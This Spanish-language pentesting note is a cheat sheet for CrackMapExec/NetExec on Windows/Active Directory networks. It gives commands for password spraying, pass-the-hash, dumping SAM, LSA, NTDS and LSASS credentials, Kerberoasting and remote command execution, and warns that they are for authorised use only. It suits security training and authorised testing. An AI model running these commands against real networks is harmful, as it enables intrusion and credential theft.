---
tags:
  - pentesting
  - post-explotacion
  - active-directory
  - smb
  - crackmapexec
  - netexec
aliases:
  - CrackMapExec
  - CME
  - NetExec
  - nxc
---

# CrackMapExec / NetExec — Navaja suiza de redes Windows/AD

**CrackMapExec (CME)** automatiza el reconocimiento, la validación de credenciales y el movimiento lateral en redes **Windows / Active Directory**. Permite probar credenciales en masa sobre muchos hosts, enumerar recursos SMB, volcar hashes y ejecutar comandos de forma remota.

> [!info] CME está descontinuado → usa **NetExec** (`nxc`)
> El proyecto se mantiene ahora como **NetExec**. La sintaxis es casi idéntica: sustituye `crackmapexec` por `nxc`. Aquí se muestran ambos. Instalación: `pipx install netexec`.

> [!warning] Uso ético
> Solo en redes **propias o con autorización explícita**. Estas acciones (volcado de hashes, ejecución remota) son altamente detectables y quedan en logs. Ver [[📜 Fuentes y Licencias]].

## Protocolos
`smb` · `winrm` · `ldap` · `mssql` · `rdp` · `ssh` · `ftp` · `http`. El más usado es **SMB**.

## SMB — reconocimiento y credenciales

```bash
# Equivalencia: crackmapexec  ≈  nxc
crackmapexec smb 10.10.10.0/24            # barrido: hostname, dominio, SMB signing
nxc smb 10.10.10.0/24

# Validar credenciales (una o en masa)
crackmapexec smb 10.10.10.5 -u usuario -p 'Password1'
crackmapexec smb 10.10.10.0/24 -u usuarios.txt -p claves.txt

# Password spraying (una clave contra muchos usuarios) → evita bloqueos
nxc smb 10.10.10.5 -u usuarios.txt -p 'Primavera2026!' --continue-on-success

# Pass-the-Hash (sin contraseña, con el hash NTLM)
crackmapexec smb 10.10.10.5 -u administrator -H <hash_NTLM>
```

> [!tip] Lectura de la salida
> `(Pwn3d!)` junto a un host significa que esas credenciales tienen **privilegios de administrador local** ahí → puedes ejecutar comandos y volcar la SAM.

## Enumeración (con credenciales válidas)

```bash
crackmapexec smb 10.10.10.5 -u user -p pass --shares     # recursos compartidos
crackmapexec smb 10.10.10.5 -u user -p pass --users      # usuarios del dominio
crackmapexec smb 10.10.10.5 -u user -p pass --groups     # grupos
crackmapexec smb 10.10.10.5 -u user -p pass --pass-pol   # política de contraseñas
crackmapexec smb 10.10.10.5 -u user -p pass --sessions   # sesiones activas
crackmapexec smb 10.10.10.5 -u user -p pass --loggedon-users
```

## Volcado de credenciales (requiere admin local)

```bash
crackmapexec smb 10.10.10.5 -u administrator -p pass --sam     # SAM local
crackmapexec smb 10.10.10.5 -u administrator -p pass --lsa     # secretos LSA
crackmapexec smb 10.10.10.5 -u administrator -p pass --ntds    # NTDS.dit (en el DC)
```
Los hashes obtenidos se crackean con [[Hashcat]] (`-m 1000` NTLM) o se reutilizan con Pass-the-Hash.

## Ejecución remota de comandos

```bash
crackmapexec smb 10.10.10.5 -u administrator -p pass -x "whoami"      # cmd
crackmapexec smb 10.10.10.5 -u administrator -p pass -X "Get-Process" # PowerShell
```

## Otros protocolos útiles

```bash
# WinRM (suele dar shell si el usuario está en Remote Management Users)
crackmapexec winrm 10.10.10.5 -u user -p pass

# LDAP: usuarios kerberoastables / AS-REP roasting
nxc ldap 10.10.10.5 -u user -p pass --kerberoasting out.txt
nxc ldap 10.10.10.5 -u '' -p '' --asreproast out.txt
```

## Módulos
```bash
crackmapexec smb -L                 # listar módulos
crackmapexec smb 10.10.10.5 -u u -p p -M lsassy   # ejemplo: volcar LSASS
```

## Relación con otras notas
- Ataques de dominio (Kerberoasting, DCSync, tickets) → [[Active Directory — Ataques]]
- Escalada local en el host comprometido → [[Escalada de Privilegios Windows]]
- Crackear los hashes volcados → [[Hashcat]] · [[John the Ripper]]
- Moverte entre segmentos de red → [[Pivoting de Red]]
- Fuerza bruta de servicios no-Windows → [[Hydra y Medusa]]

---
Fuente adaptada: `pulentoski/Herramientas-de-pentesting`. Ver [[📜 Fuentes y Licencias]].
